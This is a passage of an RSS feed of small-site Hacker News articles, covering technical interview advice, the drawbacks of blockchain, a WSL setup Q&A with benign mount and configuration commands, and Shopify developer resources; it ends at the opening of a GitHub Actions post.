<p>The thing is, you’ll rarely work alone in isolation on your own codebase. You’ll have teammates, you’ll need to agree on things with them, you’ll build on others’ code and others will build on your code. You’ll need to build solutions with a certain level of quality, in a future-proof way, for extensibility, and with performance in mind. Depending on your role and level, you’ll need to architect systems. You’ll need to mentor other engineers. You’ll need to onboard new team members. You’ll need to proactively reach out to other teams in the company and understand their points of view and problems. You’ll talk to product managers, UX researchers, designers, even customers sometimes. You’ll need to manage projects, make tradeoffs and decisions, and align other engineers with that.</p>
<p>Read my article on&nbsp;<a href="https://ochronus.online/technical-interview-myths/">the most common 11 technical interview myths</a></p>
<h2 id="types-and-stages-of-technical-interviews"><span id="Types_and_stages_of_technical_interviews">Types and stages of technical interviews</span></h2>
<p>Most companies use a combination of these steps:</p>
<ul><li>Screening call with a recruiter – We’re interested in your basic motivations, we’d like to have a gut feeling about what you’re looking for and do some sanity check here. You might get asked about your salary requirements, support you need for visa or relocation, and timelines (when could you start, etc.). Some recruiters will also ask you whether you have applied elsewhere so they know how urgent this is for them and you.</li><li>Screening call with the hiring manager – Expect some deeper dive into your experience on multiple fronts – tech and ‘soft skills’ alike. As a hiring manager, I’ll prepare by checking out your CV for talking points, maybe even your LinkedIn profile, and definitely GitHub. I’m not trying to judge you, I’m just looking for points of connection. I’ll answer any questions you have about the role, the company, the culture, potential teams you’d be joining, etc. etc. My ultimate goal with this is twofold: would we be a good match for your (and vice versa) and whether I think you’d be successful in the role.</li><li>Remote technical screening – An alternative, or at some places precursor to the online coding exercise. This is with a human on the other end of the line – solving tech problems together, usually, you walk them through your solution.</li><li>Online coding exercises (LeetCode, HackerRank, etc.) – I know you all hate this. We need such a step to filter out people who can’t even code at all early on. You’d be surprised about the number of such applicants. I avoid algorithm/data structure exercises here and try to come up with somewhat interesting ones. Some companies use a much heavier set of exercises and base their judgment of your technical skills solely on this. While I don’t agree with that strategy, you need to get prepared for this, too.</li><li>Take-home assignment – this is one of the most polarizing interview steps for engineers. Some hate it, claiming it’s just free labor for the companies and it takes too much time, others love it because they feel they have the freedom of giving it much time, really showing off their skills in their own comfortable environment. Whichever camp you’re in, you can expect some companies requiring this. You usually get a somewhat specified problem to solve and you’re given different levels of freedom on how to solve it – some companies don’t mind you choosing whichever stack you like, others will even specify the framework.</li><li>Onsite workshop / remote workshop – I think this is the most interesting of all steps (well, for me at least). It’s about solving problems together with people from the company in a simulated environment. You’ll need to show your communication, decision-making, and even prioritization skills here. Sure, people will look at the quality of your code, too, but ‘soft skills’ are just as important here. We’ll get strong signals about how it would be having you on the team.</li></ul>
<h2 id="cracking-the-technical-interview"><span id="Cracking_the_technical_interview">Cracking the technical interview</span></h2>
<h3 id="ask-the-recruiter-or-the-hiring-manager-before-the-interview"><span id="Ask_the_recruiter_or_the_hiring_manager_before_the_interview">Ask the recruiter or the hiring manager before the interview</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 3">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg.webp 306w, https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1-300x294.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20306%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 306px) 100vw, 306px">
<img width="306" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20306%20300'%3E%3C/svg%3E" alt="ask the recruiter or hiring manager 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg 306w, https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1-300x294.jpg 300w" data-lazy-sizes="(max-width: 306px) 100vw, 306px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg">
</picture>
</figure>
<p>Take the guesswork out of the equation. If you feel you don’t have enough information to prepare, just ask for more! We’re here to help you succeed. I really mean it. Sometimes we aren’t doing a great job with sharing enough information proactively about the interview steps but that’s not intentional! I’m always happy to help you prepare better – ask about anything, please. You’re doing both of us a favor with that. Ask during the previous interview step or just drop me an email at any time.</p>
<h3 id="show-up-on-time"><span id="Show_up_on_time">Show up on time</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 4">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg.webp 399w, https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1-300x226.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20399%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 399px) 100vw, 399px">
<img width="399" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20399%20300'%3E%3C/svg%3E" alt="arrive on time 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg 399w, https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1-300x226.jpg 300w" data-lazy-sizes="(max-width: 399px) 100vw, 399px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg">
</picture>
</figure>
<p>Make sure you’re there on time. If you can’t, for some reason, please let us know, we’ll happily organize for another time, no hard feelings. Showing up on time isn’t only about respecting each other’s schedule – interview time slots are usually 100% utilized and by arriving 10 minutes late you’re reducing your own chance to be successful. You’re also making it more stressful for yourself than necessary. If you need time for commute or for your Zoom/Google Meet setup, think ahead and give yourself a buffer before the start.</p>
<h3 id="don-t-jump-right-into-solution-mode-read-distill-paraphrase"><span id="Dont_jump_right_into_solution_mode_-_read_distill_paraphrase">Don’t jump right into solution mode – read, distill, paraphrase</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 5">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg.webp 328w, https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1-300x274.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20328%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 328px) 100vw, 328px">
<img width="328" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20328%20300'%3E%3C/svg%3E" alt="read distill paraphrase 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg 328w, https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1-300x274.jpg 300w" data-lazy-sizes="(max-width: 328px) 100vw, 328px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg">
</picture>
</figure>
<p>The biggest mistake you can do is thinking you understand the problem or what’s asked of you and jumping right into coding. Take your time, carefully read the problem statement, distill it, don’t think of solutions just yet. When you feel you understand what’s asked of you or when you thought about clarifying questions to ask, communicate. Paraphrase what you understood from the problem statement so you can verify it with your interviewers. Only when you’re on the same page can you shift into solution mode. Even if you come up with the best solution ultimately if you skip this step I’ll remember and have doubts about how it’d be to work with you. Thinking aloud is really useful here – it will help you and help me too to understand what’s on your mind.</p>

<h3 id="be-articulate-and-communicate-clearly"><span id="Be_articulate_and_communicate_clearly">Be articulate and communicate clearly</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 6">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg.webp 401w, https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly-300x191.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20401%20255'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 401px) 100vw, 401px">
<img width="401" height="255" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20401%20255'%3E%3C/svg%3E" alt="communicate clearly" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg 401w, https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly-300x191.jpg 300w" data-lazy-sizes="(max-width: 401px) 100vw, 401px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg">
</picture>
</figure>
<p>Even if you know your trade, if you fail to communicate clearly during your interview we’ll have no way of knowing. This takes practice for most people, so take your time and prepare! Use standard terms that other engineers can relate to, avoid passive voice, and be able to articulate what’s going on in your mind while you’re thinking. If you need some time to think quietly, say so, don’t just fall silent suddenly. We’re trying our best to communicate our expectations around this but it might be a bit late when you’re in the interview. Trust me on this one, practice here goes a long way.</p>
<h3 id="ask-clarifying-questions"><span id="Ask_clarifying_questions">Ask clarifying questions</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 7">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-clarifying-questions-1.jpg.webp" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20269%20300'%3E%3C/svg%3E">
<img width="269" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20269%20300'%3E%3C/svg%3E" alt="ask clarifying questions 1" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/ask-clarifying-questions-1.jpg">
</picture>
</figure>
<p>While you’d think the interview is about you answering questions, expect that you will need to ask a lot of questions! When you are in the interview and something is not clear don’t default to thinking “Oh god, I should know this, I should understand” – sometimes we are interested in how you behave in such situations, and sometimes we’re just simply not good enough in giving enough context. If you’re stuck, a good technique is to ask for clarification! It’s also 100% OK to say things like “I didn’t quite get that. Could you rephrase please?” or “I’m not sure I understand what you’re asking”. These are good signals! I expect my team members to behave like this. These are not signals of you failing. I know it feels like that, but trust me, it’s just your brain playing tricks on you. I highlight this during the interview several times, to make sure the candidate feels safe asking such questions. Another technique I wholeheartedly welcome is paraphrasing – e.g. “What I understood from what you said is that I should implement this using co-monads” (said nobody ever).</p>
<h3 id="demonstrate-your-tech-skills-the-right-way"><span id="Demonstrate_your_tech_skills_the_right_way">Demonstrate your tech skills the right way</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 8">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/t-shaped-engineer.jpg.webp" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20293%20300'%3E%3C/svg%3E">
<img width="293" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20293%20300'%3E%3C/svg%3E" alt="t shaped engineer" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/t-shaped-engineer.jpg">
</picture>
</figure>
<p>Make us see that you’re deeply proficient in at least one technology. This can be a programming language, for example. Also, demonstrate that you know the adjacent technologies – most companies are looking for so-called T-shape engineers. This means that mentioning other aspects of the problem and the solution goes a long way. For example, if you’re asked to implement a service in NodeJS, mention how you’d deploy, monitor, and scale it, even if that’s not explicitly asked. No need to go into too many details (unless people ask you). If you’re only focused on a single piece of the puzzle I’ll have a hard time seeing how you’d perform well in a changing environment (where you’ll need to make connections and work on multiple zoom levels and be ready). This is a very generic statement and might not be true in the case of highly specialized roles, of course. On the other hand, if you say your primary language is Python yet you can’t seem to show even a basic understanding of it, that’s a no-no. Work on the stem of that T, too. Hopefully, you’ve clarified what you’d be doing on the interview upfront (see advice #1) so you can think about adjacent technologies in advance.</p>
<h3 id="don-t-get-too-focused-or-stuck-on-a-solution"><span id="Dont_get_too_focused_or_stuck_on_a_solution">Don’t get too focused or stuck on …</span></h3></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ochronus.online/acing-the-tech-interview/">https://ochronus.online/acing-the-tech-interview/</a></em></p>]]>
            </description>
            <link>https://ochronus.online/acing-the-tech-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067800</guid>
            <pubDate>Thu, 12 Nov 2020 08:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You don't need a blockchain solution for your next project]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25067702">thread link</a>) | @shrmv
<br/>
November 12, 2020 | https://exyte.com/blog/why-you-dont-need-a-blockchain-solution-for-your-next-project | <a href="https://web.archive.org/web/*/https://exyte.com/blog/why-you-dont-need-a-blockchain-solution-for-your-next-project">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>Blockchain is one of the hottest technology fields of the last decade, together with machine learning and big data. According to the <a rel="nofollow" href="https://www2.deloitte.com/content/dam/insights/us/articles/6608_2020-global-blockchain-survey/DI_CIR%202020%20global%20blockchain%20survey.pdf">Deloitte 2020 Global Blockchain Survey</a>, businesses worldwide find blockchain an integral part of organizational innovation. </p>
<p>Properly implemented, a blockchain solution can make parts of your business transparent or enable different actors to cooperate quickly and trustlessly. </p>
<p>But today, we wonâ€™t examine blockchainâ€™s strengths. Instead, we will look at why itâ€™s not the perfect choice for all your software projects.  </p>
<h2>Blockchain is more expensive</h2>
<p>From our experience, infrastructure and maintenance costs for a blockchain solution are typically 10-15 times higher compared to an ordinary server with a database running on AWS or a custom AWS/GCP/Azure solution.</p>
<p>Even when using economically efficient Azure solutions, it can cost up to ten times more when compared to a centralized DB with similar functionality running on AWS.</p>
<p>Therefore, itâ€™s necessary to seriously weigh the costs of running your solution vs. the need for transparency and distribution that blockchain offers. </p>
<h2>Blockchain scales worse</h2>
<p>Performance and scalability are the two major bottlenecks for any blockchain project. </p>
<p>From our experience working for large enterprise companies such as Bayer AG, Delta, PwC, and others, blockchain solutions that work fine for hundreds and thousands of users degrade in performance quite quickly when they need to serve more than ten thousand users.</p>
<p>Scaling blockchain, on the other hand, usually requires a complete rework of the core. Sometimes, there might even be no viable solution. So, despite some ambitious claims by blockchain companies, scaling is still an immature topic in the blockchain world.</p>
<h2>Blockchain is about transparency, not privacy</h2>
<p>Privacy is an issue. It is challenging to maintain privacy on the blockchain. In contrast to regular solutions, existing blockchain solutions are often all about transparency rather than privacy.</p>
<p>Solutions that provide the required level of privacy typically have to compromise on performance through zero-knowledge proofs or other kinds of encryption, which is costly.</p>
<p>Another problem with privacy is that most of the time, blockchain is permissionless or has very primitive permissions levels. Therefore, solutions for permissions are built on top of it as an additional middle layer, which, of course, adds performance overhead, degrades scalability, adds implementation and execution costs, etc.
Conclusion</p>
<p>There are three significant challenges that blockchain projects face: performance, scalability, and privacy. While there are multiple benefits for using blockchain, such as transparency and the ability to operate trustlessly, they need to be weighed against the downsides. </p>
<p>We want to share our knowledge with you about potential problems not to talk you away from blockchain, but to make sure the choice is clear and the right one for your project. If you still arenâ€™t sure and would like to have a 30-minute consultation with an expert in the field, youâ€™re welcome to <a href="https://exyte.com/contacts">contact us</a>. </p>
                </div></div>]]>
            </description>
            <link>https://exyte.com/blog/why-you-dont-need-a-blockchain-solution-for-your-next-project</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067702</guid>
            <pubDate>Thu, 12 Nov 2020 08:25:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WSL explained – crucial Q&A to get to know near-native Linux experience]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067677">thread link</a>) | @Pabloemm
<br/>
November 12, 2020 | https://solidstudio.io/blog/windows-subsystem-for-linux-explained.html | <a href="https://web.archive.org/web/*/https://solidstudio.io/blog/windows-subsystem-for-linux-explained.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><a href="https://solidstudio.io/index.html">Solidstudio</a>
                    &gt;&gt;
                    <a href="https://solidstudio.io/blog/blog.html">Blog</a>
                    &gt;&gt;
                    &gt;Windows Subsystem for Linux (WSL) explained – Q&amp;A
                </p>
                <p>No matter if you program in <a href="https://solidstudio.io/technologies/java.html">Java</a> or <a href="https://solidstudio.io/technologies/kotlin.html">Kotlin</a> or with other technologies, operating on Linux has a number of advantages. One of them is access to Linux Bash with its useful commands.</p>
                <p>However, some developers have to or prefer working on Windows. As stackoverflow.com 2020 <a href="https://insights.stackoverflow.com/survey/2020#development-environments-and-tools" rel="nofollow">survey</a> showed, almost half of developers (45,8%) work in the Windows environment. There are tools that bring them closer to the Linux world like <a href="https://www.cygwin.com/" ref="nofollow">Cygwin</a>.</p>
                
                <h2>The WSL provides a near-native Linux experience</h2>
                <p>Some time ago Microsoft introduced WSL, a new tool that brings Windows users even closer to the Linux experience. Here you can find gathered some frequently asked questions and our expert’s experience to help you get a better understanding of the WSL.</p>
                
                <h3>What is WSL?</h3>
                <p>WSL or Windows Subsystem for Linux is a part of the Windows operating system that allows running native Linux binaries. A number of distributions exist that can be installed and used. </p>
                
                <h3>How can I install WSL?</h3>
                <p>First thing to do before installing any Linux distribution is to install the WSL itself.</p>
                <p>Go to <i>Control Panel</i> → <i>Programs</i> → <i>Programs and Features</i> → <i>Turn Windows features on and off</i>.</p>
                <p>Select <i>Windows Subsystem for Windows</i>, confirm, and restart the system.</p>
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/wsl-install.png" alt="Turn Windows features on and off dialog with Windows Subsystem for Linux selected"></p><p>Now you are ready to select and install a Linux distribution of your choice.</p>
                                
                <h3>What Linux distributions are available on WSL?</h3>
                <p>To find a list of available distributions open Windows Store and search for "Linux".<br>
                The most popular are:
                </p><ul>
                <li>Ubuntu 18.04 and 20.04</li>
                <li>SUSE Linux Enterprise Server</li>
                <li>Debian</li>
                <li>Fedora Remix for WSL</li>
                <li>Kali Linux</li>
                </ul>                
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/windows-store-search.png" alt="Windows Store search result for term Linux"></p><h3>Is it possible to run graphical Linux applications from WSL?</h3>
                <p>Yes, it is possible. You need to install an X Window System server application on your Windows, for example <a href="https://sourceforge.net/projects/xming/" rel="nofollow">Xming X Server for Windows</a>.</p>
                <p>Then check if your WSL system has a <span>DISPLAY</span> environment variable set up. If not set it to <span>:0</span>.</p>
                <pre>export DISPLAY=:0</pre>
                <p>After this configuration you are free to run native Linux applications with user interface.</p>
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/xclock.png" alt="WSL running xclock via Xming"></p><h3>Where is wsl.conf located?</h3>
                <p>Each WSL instance can be further configured by creating and editing a config file <span>/etc/wsl.conf</span>.</p>
                
                <h3>How to access Windows files from WSL?</h3>
                <p>All fixed drives with the NTFS or ReFS file system are automatically mounted in <span>/mnt</span> directory. For example a C: drive can be accessed in <span>/mnt/c/</span>. The directory where drives are mounted can be specified in <span>/etc/wsl.conf</span> as follows:</p>
                <pre>[automount]
root=/</pre>
                <p>This setting will cause drives to be mounted under the root folder, so the C: drive would be accessible through <span>/c</span> folder.</p>

                <h3>How to access pendrive from WSL?</h3>
                <p>Unlike fixed drives, removable drives are not mounted automatically. To access files stored on a USB stick you need to mount it yourself. For this purpose, use these commands (assume the drive letter in Windows is F):</p>
                <pre>sudo mkdir /mnt/f
sudo mount -t drvfs H: /mnt/f</pre>

                <h3>How to connect to a DVD drive from WSL?</h3>
                <p>Optical drives are not as popular nowadays as they used to be. Nonetheless, they can be accessed the same way as pendrives (assume G is the drive letter):</p>
                <pre>sudo mkdir /mnt/g
sudo mount -t drvfs G: /mnt/g</pre>

                <h3>Where are WSL files stored?</h3>
                <p>WSL files are exposed through a network share <span>\\wsl$\[distro name]</span>, for example my home directory is at <span "="">\\wsl$\Ubuntu-20.04\home\pawelb</span>.</p>
                <p>Physically the WSL files are located at <span>%USERPROFILE%\AppData\Local\Packages\[distro name]</span>. My home folder is at this rather long path <span>C:\Users\pawelb\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\home\pawelb</span>.</p>
                <p>However, it is worth noting that manipulating WSL files from within Windows should be avoided as it can destroy Linux-specific file metadata. If you need to manipulate files on both WSL and Windows, store them on a Windows drive and access them from within WSL via <span>/mnt</span>.</p>
                
                <h3>Is it possible to run Windows programs from within WSL?</h3>
                <p>Yes, the WSL was built with interoperability in mind. It can run native Windows programs. However, if this feature is not needed, the user can disable it by adding <span>enabled=false</span> into <span>[interop]</span> section in <span>wsl.conf</span>.</p>
                <pre>[interop]
enabled=false</pre>

                
                <h3>What terminal application to use?</h3>
                <p>Any terminal can do the job, even the good old <span>cmd.exe</span>. Just run the WSL command in. There is however one great application that makes running the WSL console easier. It’s <a href="https://docs.microsoft.com/en-us/windows/terminal/get-started" rel="nofollow">Windows Terminal</a> and it can be installed from Windows Store. It automatically detects any WSL distributions installed and adds an option to run its console. It also supports regular Windows Command Line, PowerShell, and Azure console out of the box. Also, it supports tabs and split view inside a tab.</p>
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/windows-terminal.png" alt="Windows Terminal application"></p><h3>Caveats of interoperability with Windows</h3>
                <p>By default, WSL can run Windows binaries and also appends its <span>%PATH%</span> variable into the <span>$PATH</span> variable of Linux running under WSL. In most cases, this is useful or at least does no harm. However, sometimes unexpected behavior occurs.</p>
                <p>This happened when I tried to run <span>npm</span>.</p>
                <pre>$ npm -v
module.js:471
    throw err;
    ^

Error: Cannot find module '\\wsl$\Ubuntu-20.04\c\Programs\nvm\v6.10.2\node_modules\npm\bin\npm-cli.js'
    at Function.Module._resolveFilename (module.js:469:15)
    at Function.Module._load (module.js:417:25)
    at Module.runMain (module.js:604:10)
    at run (bootstrap_node.js:393:7)
    at startup (bootstrap_node.js:150:9)
    at bootstrap_node.js:508:3</pre>
                
                <p>This error message is not helpful at all. What happened?</p>
                <p>After some investigation, I found out that I had also installed npm on Windows and WSL was using this executable to run. This unfortunately failed under WSL environment.</p>
                <p>A fix was rather simple. I disabled appending Windows <span>%PATH%</span> to WSL <span>$PATH</span>.</p>
                <p>This can be done in two ways.</p>
                <p>The first is to use the Registry Editor (regedit) to add a DWORD <span>AppendNtPath</span> with value <span>0</span> under <span>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss</span>. This affects all WSL distributions.</p>
                <p>The second way is to set a property in <span>/etc/wsl.conf</span>. This affects only a single distribution.</p>
                <pre>[interop]
appendWindowsPath=false</pre>

                <h2>The WSL is a great subsystem for Windows </h2>
                <p>With the introduction of Windows 10, a lot has changed. It seems that the system and its features are more and more thought-out and intuitive. A programmer needs a proper working environment. With WSL, Windows is keeping up with developments in this area, and looks like it is a step in the right direction. It’s worth having an eye on the development of this solution, hoping that in the future the developers will have a variety of systems that can really compete with each other. Looking for a good and stable, seamless tool, it is worth trying with the WSL.</p>
                
                
                
            </div></div>]]>
            </description>
            <link>https://solidstudio.io/blog/windows-subsystem-for-linux-explained.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067677</guid>
            <pubDate>Thu, 12 Nov 2020 08:21:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Become a Shopify Developer – Resources to Become a Shopify Dev]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25067407">thread link</a>) | @iliashad
<br/>
November 11, 2020 | https://iliashaddad.com/blog/how-to-become-shopify-developer | <a href="https://web.archive.org/web/*/https://iliashaddad.com/blog/how-to-become-shopify-developer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><div><article><div><p><span>
      <a href="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/af240/how-to-become-shopify-developer-0.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="how to become shopify developer 0" title="how to become shopify developer 0" src="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/0a251/how-to-become-shopify-developer-0.jpg" srcset="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/bce2d/how-to-become-shopify-developer-0.jpg 250w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/953fe/how-to-become-shopify-developer-0.jpg 500w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/0a251/how-to-become-shopify-developer-0.jpg 1000w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/e3932/how-to-become-shopify-developer-0.jpg 1500w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/451a4/how-to-become-shopify-developer-0.jpg 2000w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/af240/how-to-become-shopify-developer-0.jpg 2600w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
  </a>
    </span></p><p>Shopify has been growing so fast in the last couple of years. “We made history in 2018: no other SaaS company has crossed the $1 billion-dollar revenue mark at a faster growth rate than Shopify has,” said <a href="https://investors.shopify.com/Investor-News-Details/2019/Shopify-Announces-Fourth-Quarter-and-Full-Year-2018-Financial-Results/default.aspx">Tobi Lütke</a></p><p>I’m a self-taught developer who worked as a freelancer and indie maker in 2019 and I learned Shopify app and theme development and I want to share with you resources that help me to become a Shopify developer</p><h3><strong>Prerequisite to learn Shopify Theme Development&nbsp;:</strong></h3><p>Shopify theme is like WordPress themes but Shopify use their markup language (Liquid ) instead of PHP</p><p>You need to</p><ul><li>have basic knowledge with HTML5, CSS3, and JavaScript</li><li>have basic knowledge with jQuey (Many Shopify libraries use jQuery ) — Optional</li><li>have basic knowledge with Command Line</li><li>Create a <a href="https://accounts.shopify.com/signup">Shopify Partner account</a> to upload and test your Shopify theme (Free with unlimited Shopify store for development)</li></ul><h3>Prerequisite to learn Shopify App Development&nbsp;:</h3><p>Shopify app is a web app and you can use any programming language like Ruby, Python, PHP or Node JS to build one and in this guide, I’ll focus on Node JS in this guide</p><p>You need to&nbsp;:</p><ul><li>have basic knowledge with HTML5, CSS3</li><li>a good understanding of JavaScript and React (Shopify Polaris built With React but you can use any framework or just vanilla JS)</li><li>good understanding of how to build a full-stack web application (Authentication, consume external API, Send Requests from the front end and deal with it in the back end )</li><li>have basic knowledge with GraphQL (Shopify API built with GraphQL)</li><li>Create a <a href="https://accounts.shopify.com/signup">Shopify Partner account</a> to create, test and publish your Shopify app (Free)</li></ul><h3>Ressources to learn Shopify Theme Development</h3><ul><li><a href="https://www.shopify.com/partners/blog/">Shopify Partner Blog</a>: Articles and guides about design inspiration, Shopify development tips</li><li><a href="https://www.shopify.com/partners/academy">Shopify Partner Academy</a>: Free courses from Shopify team to learn how to work with Shopify tools</li><li><a href="https://www.skillshare.com/classes/Shopify-Essentials-for-Web-Developers-From-Store-Setup-to-Custom-Themes/1070001866/projects">Shopify for web dev</a>elopers: (Free course) Set up your first Shopify store and create your first custom Shopify theme by a Shopify Expert</li><li><a href="https://www.skillshare.com/classes/Advanced-Shopify-Theme-Development/708093439?utm_campaign=video-embed-708093439&amp;utm_source=Video&amp;utm_medium=video-embed">Advanced Shopify</a> Theme: (Free course) Create advanced Shopify theme (Make Shopify theme a single web app using AJAX ) by a Shopify expert</li><li><a href="https://www.shopify.co.uk/partners/shopify-cheat-sheet">Liquid Cheatsheet</a>: Cheatsheet to get all Shopify liquid variables, filters, and helpers</li><li><a href="https://shopify.github.io/liquid-code-examples/">Liquid Code Examples:</a> Collection of code snippets to speed up your development process and understand how to write liquid code</li><li><a href="https://www.youtube.com/playlist?list=PLXQCP3o-w1Pvras8iuflJKO3tfkBT8c0c">Shopify YB Playlist:</a> Youtube course to learn Shopify theme development</li><li><a href="https://shopify.github.io/themekit/">Shopify Theme Kit</a>: a command-line tool to upload your Shopify theme to a Shopify store automatically when changes are made locally</li><li><a href="https://help.shopify.com/en/themes/development">Shopify Theme Docs</a>: Shopify docs to create your Shopify theme</li></ul><h3>Ressources to learn Shopify App Development</h3><ul><li><a href="https://www.shopify.com/partners/blog/">Shopify Partner Blog</a>: Articles and guides about design inspiration, Shopify development tips</li><li><a href="https://www.shopify.com/partners/academy">Shopify Partner Academy</a>: Free courses from Shopify team to learn how to work with Shopify tools</li><li><a href="https://developers.shopify.com/tutorials/build-a-shopify-app-with-node-and-react/set-up-your-app">Shopify React Node App</a>: Tutorial by Shopify team to create your first React and Node JS Shopify app using Polaris (Shopify React design system) and KOA Js to handle server-side rendering</li><li><a href="https://github.com/Shopify/shopify-app-cli">Shopify App CLI:</a> Create your Shopify app like (Create React App), serve your shopify app in Ngrok server (Free) and update your Ngrok server link automatically in your Shopify App dashboard</li></ul><h3>Conclusion</h3><p>Thanks for reading, I wish you the best on your new journey.</p></div></article></div></main></div></div>]]>
            </description>
            <link>https://iliashaddad.com/blog/how-to-become-shopify-developer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067407</guid>
            <pubDate>Thu, 12 Nov 2020 07:32:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Custom GitHub Actions with Docker]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066079">thread link</a>) | @sethetter
<br/>
November 11, 2020 | https://sethetter.com/posts/github-actions-with-docker/ | <a href="https://web.archive.org/web/*/https://sethetter.com/posts/github-actions-with-docker/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <section>
